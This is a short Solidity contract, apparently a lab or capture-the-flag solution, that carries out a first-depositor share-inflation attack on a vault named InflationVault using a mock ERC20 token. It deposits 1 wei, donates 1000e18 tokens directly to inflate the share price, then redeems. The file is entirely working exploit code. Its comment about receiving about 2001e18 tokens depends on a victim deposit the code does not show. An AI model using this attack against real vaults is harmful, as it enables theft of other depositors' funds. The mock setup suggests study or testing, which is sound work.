// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflationVault} from "../src/InflationVault.sol";
import {MockERC20} from "../src/MockERC20.sol";

contract InflationAttack {
    InflationVault public vault;
    MockERC20 public token;

    constructor(address _vault, address _token) {
        vault = InflationVault(_vault);
        token = MockERC20(_token);
    }

    function pwn() external {
        // 1. First depositor: deposit 1 wei
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        
        // 2. Donate 1000e18 tokens directly to vault (inflate share price)
        token.transfer(address(vault), 1000e18);
    }

    function take() external {
        // 3. Redeem 1 share at inflated price → get ~2001e18 tokens
        vault.redeem(vault.shares(address(this)));
    }

    receive() external payable {}
}